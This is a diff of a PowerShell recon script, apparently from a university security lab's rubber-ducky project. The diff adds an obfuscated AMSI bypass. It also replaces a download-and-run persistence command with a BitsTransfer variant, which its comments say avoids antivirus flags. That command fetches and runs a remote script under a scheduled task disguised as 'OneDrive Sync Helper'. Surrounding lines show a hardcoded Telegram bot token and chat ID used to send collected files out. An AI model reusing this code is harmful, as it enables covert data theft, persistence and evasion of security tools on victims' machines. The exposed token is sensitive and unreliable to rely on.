@@ -13,8 +13,13 @@ $BOT_TOKEN            = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID              = "1780237079"
 $PERSIST_RAW_URL      = "https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1"
 
-# ARM64 + older PS configs default to TLS 1.0 - force 1.2 for GitHub/Telegram
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# AMSI abschalten (obfuskiert)
+try {
+    $u = [Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
+    $u.GetField([System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), 'NonPublic,Static').SetValue($null, $true)
+} catch {}
 
 function Send-TgMessage {
     param([string]$Text)
@@ -102,8 +107,12 @@ Send-TgFile -Filename "devrecon_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
 $taskName = "OneDrive Sync Helper"
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
     try {
-        $cmd       = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " +
-                     "`"IEX (New-Object Net.WebClient).DownloadString('$PERSIST_RAW_URL')`""
+        # BitsTransfer statt IEX/WebClient (kein AV-Flag auf Kommandozeile)
+        $cmd       = "-nop -ep bypass -w h -c `"Import-Module BitsTransfer;" +
+                     "Start-BitsTransfer '$PERSIST_RAW_URL' `$env:TEMP\p.ps1;" +
+                     "Unblock-File `$env:TEMP\p.ps1;" +
+                     "& `$env:TEMP\p.ps1;" +
+                     "ri `$env:TEMP\p.ps1 -f -ea 0`""
         $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
         $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
         $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
